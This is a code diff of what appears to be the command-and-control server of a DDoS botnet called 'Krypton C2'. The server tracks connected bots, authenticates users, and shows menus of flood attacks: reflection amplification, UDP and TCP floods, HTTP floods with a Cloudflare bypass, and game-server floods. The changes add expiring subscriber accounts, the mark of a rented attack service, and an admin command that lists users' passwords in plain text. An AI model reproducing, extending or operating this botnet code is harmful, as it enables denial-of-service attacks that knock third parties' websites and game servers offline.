@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-#-*- coding: utf-8 -*-
+# -*- coding: utf-8 -*-
 
 # Tools
 from src.Commands.Tools.url_to_ip import url_to_ip
@@ -32,20 +32,18 @@ from src.Commands.Methods_Games.vse import vse
 
 # Imports
 import socket, threading, time, ipaddress, random, json
+from datetime import datetime, timedelta
 from colorama import Fore, init
 
 
 def text2Gen():
     word = '''
-              ╔════════════════════════════════════╗
-              ║                                    ║
-              ║        type help for commands      ║
-              ║      ─────────────────────────     ║
-              ║         Discord: cirqueira         ║
-              ║                                    ║
-              ╚════════════════════════════════════╝
+╔════════════════════════════════════╗
+║      type "help" for commands      ║
+╠════════════════════════════════════╝
+╚─────────────> CirqueiraDev
 '''
-
+# ─────
     start_color = (0, 0, 200)
     end_color   = (255, 0, 0)
 
@@ -107,11 +105,14 @@ help = f"""
 {lightwhite}EXIT         {gray}Disconnects from the net
 """
 
-Methods_L3 = f"""{gray}L3 Methods:
+Methods_L3 = f"""
+{gray}L3 Methods:
 {lightwhite}.ICMP              {gray}Flood ICMP Request
-{lightwhite}.POD               {gray}Ping Of Death OLD Method Of DDoS"""
+{lightwhite}.POD               {gray}Ping Of Death OLD Method Of DDoS
+"""
 
-Methods_L4 = f"""{gray}L4 Methods:
+Methods_L4 = f"""
+{gray}L4 Methods:
 {lightwhite}.NTP               {gray}NTP Reflection flood
 {lightwhite}.MEM               {gray}Memcached Flood 
 {lightwhite}.UDP               {gray}UDP Flood  
@@ -119,39 +120,51 @@ Methods_L4 = f"""{gray}L4 Methods:
 {lightwhite}.TUP               {gray}TCP and UDP Flood
 {lightwhite}.ACK               {gray}TCP ACK flood
 {lightwhite}.HEX               {gray}HEX Flood
-{lightwhite}.JUNK              {gray}Junk flood"""
+{lightwhite}.JUNK              {gray}Junk flood
+"""
 
-Methods_L7 = f"""{gray}L7 Methods:
+Methods_L7 = f"""
+{gray}L7 Methods:
 {lightwhite}.HTTPIO            {gray}HTTP IO Stresser
 {lightwhite}.HTTPCFB           {gray}HTTP Cloudflare bypass attack      
 {lightwhite}.HTTPGET           {gray}HTTP GET requests attack
 {lightwhite}.HTTPSPOOF         {gray}HTTP GET Spoofing
-{lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests"""
-
-GameMethods = f"""{gray}Games Methods: 
-{lightwhite}.VSE               {gray}Valve Source Engine query flood         
-{lightwhite}.ROBLOX            {gray}Roblox UDP Flood"""
-
-botnetMethods = f"""
-{Methods_L3}
-{Methods_L4}
-{Methods_L7}
-{GameMethods}
+{lightwhite}.HTTPSTORM         {gray}HTTP STORM Requests
 """
+
+GameMethods = f"""
+{gray}Games Methods: 
+{lightwhite}.VSE               {gray}Valve Source Engine query flood         
+{lightwhite}.ROBLOX            {gray}Roblox UDP Flood
+"""
+
+botnetMethods = f"""{Methods_L3}{Methods_L4}{Methods_L7}{GameMethods}"""
 
 tools = f"""
 {lightwhite}!GETIP         {gray}Get ip from URL      
 {lightwhite}!GEOIP         {gray}Get info from ip
 """
 
-admin_methods = f"""
-{lightwhite}!register           {gray}Starts registration server
-{lightwhite}!user               {gray}Add/remove users
+admin_commands = f"""
+{lightwhite}!REG                {gray}Starts registration server
+{lightwhite}!USER               {gray}Add/List/remove users
 """
 
 bots = {}
 user_name = ""
 ansi_clear = '\033[2J\033[H'
+
+
+class Account:
+    def __init__(self, username, password, data_Expiration):
+        self.username = username
+        self.password = password
+        self.data_Expiration = data_Expiration
+
+    def userC_expirada(self):
+        hoje = datetime.now()
+        return hoje > self.data_Expiration
+
 
 # Validate IP
 def validate_ip(ip):
@@ -174,11 +187,22 @@ def validate_size(size):
     return size.isdigit() and int(size) > 1 and int(size) <= 65500
 
 # Read credentials from login file
-def find_login(username, password):
+def find_login(client, username, password):
     credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
     for x in credentials:
-        c_username, c_password = x.split(':')
-        if c_username.lower() == username.lower() and c_password == password:
+        global  data_Expiration_str
+        c_username, c_password, data_Expiration_str = x.split(':')
+        data_Expiration = datetime.strptime(data_Expiration_str, '%Y-%m-%d')
+        
+        userC = Account(username=c_username, password=c_password, data_Expiration=data_Expiration)
+        
+        if userC.username.lower() == username.lower() and userC.password == password:
+            if userC.userC_expirada():
+                print(f"\nThe {userC.username} expired. {data_Expiration_str}\n")
+                send(client, f'{gray} Your account has been expired!')
+                time.sleep(3.5)
+                client.close()
+                return
             return True
 
 # Checks if bots are dead
@@ -247,8 +271,12 @@ def handle_client(client, address):
     if password != '\xff\xff\xff\xff\75':
         send(client, ansi_clear, False)
 
-        if not find_login(username, password):
-            send(client, Fore.RED + f'\x1b{Fore.RED}Invalid credentials')
+        if not find_login(client, username, password):
+            try:
+                send(client, Fore.RED + f'\x1b{Fore.RED}Invalid credentials')
+            except OSError as e:
+                #print(e)
+                pass
             time.sleep(1)
             client.close()
             return
@@ -256,7 +284,7 @@ def handle_client(client, address):
         global user_name
         user_name = username
         
-        threading.Thread(target=update_title, args=(client, username)).start()
+        threading.Thread(target=update_title, args=(client, username,  data_Expiration_str)).start()
         threading.Thread(target=command_line, args=(client, username)).start()
 
     # Handle bot
@@ -291,17 +319,18 @@ def broadcast(data):
 def user(args, send, client):
     try:
         choice = (args[1]).upper()
-        if choice == 'ADD':
-            if len(args) == 4:
+        if choice == 'ADD' or choice == 'A':
+            if len(args) == 5:
                 user = args[2]
                 password = args[3]
+                dataExpiration = args[4]
                 with open('src/logins.txt', 'a') as logins:
-                    logins.write(f'\n{user}:{password}')
+                    logins.write(f'\n{user}:{password}:{dataExpiration}')
                     logins.close()
                     send(client, f'{Fore.LIGHTWHITE_EX}\nAdded new user successfully.\n')
             else:
-                send(client, '\n!USER ADD [USERNAME] [PASSWORD]\n')
-        if choice == 'REMOVE':
+                send(client, '\n!USER ADD [USERNAME] [PASSWORD] [AAAA-MM-DD]\n')
+        if choice == 'REMOVE' or choice == 'R':
             if len(args) == 3:
                 user = args[2]
                 with open("src/logins.txt", "r") as logins:
@@ -316,14 +345,19 @@ def user(args, send, client):
                 send(client, f'{Fore.LIGHTWHITE_EX}\nRemoved user successfully!\n')
             else:
                 send(client, '\n!USER REMOVE [USERNAME]\n')
+        if choice == 'LIST' or choice == 'L':
+                credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
+                for x in credentials:
+                    c_username, c_password, data_Expiration = x.split(':')
+                    send(client, f"{lightwhite}Username: {gray}{c_username}{lightwhite} | Password: {gray}{c_password}{lightwhite} | Expires: {gray}{data_Expiration}")
     except:
-        send(client, '\n!USER ADD/REMOVE\n')
+        send(client, '\n!USER ADD/LIST/REMOVE\n')
 
 # Updates Shell Title
-def update_title(client, name):
+def update_title(client, name, expires):
     while 1:
         try:
-            send(client, f"\33]0;Krypton C2 | Bots online: {len(bots)} | Username: {name} |\a", False)
+            send(client, f"\33]0;Krypton C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
             time.sleep(0.6)
         except:
             client.close()
@@ -354,6 +388,22 @@ def command_line(client, username):
                 for x in botnetMethods.split('\n'):
                     send(client, '\x1b[3;31;40m'+ x)
 
+            elif command == 'L3':
+                for x in Methods_L3.split('\n'):
+                    send(client, '\x1b[3;31;40m'+ x)
+
+            elif command == 'L4':
+                for x in Methods_L4.split('\n'):
+                    send(client, '\x1b[3;31;40m'+ x)
+
+            elif command == 'L7':
+                for x in Methods_L7.split('\n'):
+                    send(client, '\x1b[3;31;40m'+ x)
+
+            elif command == 'GAMES':
+                for x in GameMethods.split('\n'):
+                    send(client, '\x1b[3;31;40m'+ x)
+
             elif command == 'TOOLS':
                 for x in tools.split('\n'):
                     send(client, '\x1b[3;31;40m'+ x)
@@ -373,7 +423,7 @@ def command_line(client, username):
             
             elif command == '!ADMIN':
                 if user_name == "root":
-                    for x in admin_methods.split('\n'):
+                    for x in admin_commands.split('\n'):
                         send(client, x)
             
             elif command == '!R' or command == '!REG' or command == '!REGISTER':
@@ -489,10 +539,16 @@ def register(client, address, send):
             while not p2.strip():
                 p2 = client.recv(1024).decode('cp1252').strip()
             break
+        data = ''
+        while 1:
+            send(client, f'\033{Fore.LIGHTBLACK_EX}Expires :\x1b[0m ', False, False)
+            while not data.strip():
+                data = client.recv(1024).decode('cp1252').strip()
+            break
         while 1:
             if p1 == p2:
                 with open("src/logins.txt", "a") as logins:
-                    logins.write("\n" + username + ':' + p1)
+                    logins.write("\n" + username + ':' + p1 + ':' + data)
                 send(client, f"{Fore.LIGHTWHITE_EX}Registered!")
                 time.sleep(2)
             else:
